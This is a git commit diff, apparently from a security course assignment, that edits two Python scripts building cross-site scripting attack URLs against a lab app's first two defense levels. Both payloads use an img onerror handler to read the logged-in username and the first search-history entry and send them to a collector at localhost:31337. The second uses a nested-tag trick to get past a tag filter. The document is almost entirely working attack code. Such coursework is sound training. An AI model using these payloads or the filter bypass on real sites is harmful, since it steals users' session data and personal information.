612a4c720f3cef7751db220013a551deadf24849
Zachary Royer <zach.royer14@gmail.com>
2025-04-16 22:25:10 -0600

    Fixed bug with hex encoded curly braces. Added txt documents with URLs. Zipped. Ready to submit.

--- xss1-builder.py
+++ xss1-builder.py
@@ -5,10 +5,9 @@ xss = "&xssdefense=1"
 
 script = '''
 <img src=x
-onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',%7Bstolen_user: username,first_search: firstSearch});">
+onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',{stolen_user: username,first_search: firstSearch});">
 '''
 encoded = urllib.parse.quote(script)
 final_url = url_RAW + encoded + xss
 
 print(final_url)
-
--- xss2-builder.py
+++ xss2-builder.py
@@ -5,7 +5,7 @@ xss = "&xssdefense=2"
 
 script = '''
 <i<imgmg src=x
-onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',%7Bstolen_user: username,first_search: firstSearch});">
+onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',{stolen_user: username,first_search: firstSearch});">
 '''
 encoded = urllib.parse.quote(script)
 final_url = url_RAW + encoded + xss
